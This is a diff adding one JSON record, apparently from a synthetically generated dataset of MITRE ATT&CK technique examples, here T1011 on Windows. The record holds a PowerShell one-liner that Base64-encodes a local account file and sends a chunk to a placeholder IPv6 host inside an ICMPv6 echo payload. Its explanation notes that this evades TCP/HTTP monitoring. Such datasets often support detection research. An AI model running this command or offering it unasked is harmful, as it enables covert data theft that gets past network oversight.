@@ -1,0 +1,21 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$b=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\ProgramData\\acct.bin')); $chunk=$b.Substring(0,[Math]::Min(800,$b.Length)); nping.exe --icmp -6 2001:db8:dead:beef::26 --data-string ('C1:'+ $chunk) -c 1",
+  "explanation": "Sends the first chunk of Base64-encoded data inside an ICMPv6 Echo payload, diverging from typical TCP-based channels and fitting T1011 behavior. Chunk labeling supports multi-packet exfil.",
+  "rationale_steps": [
+    "Create a manageable Base64 chunk with a simple label.",
+    "Transmit via ICMPv6 to avoid standard TCP/HTTP monitoring paths."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-6919b9bb-7fdda75d",
+  "source_prompt_hash": "6919b9bb",
+  "timestamp_utc": "2025-09-30T08:36:22.996855Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
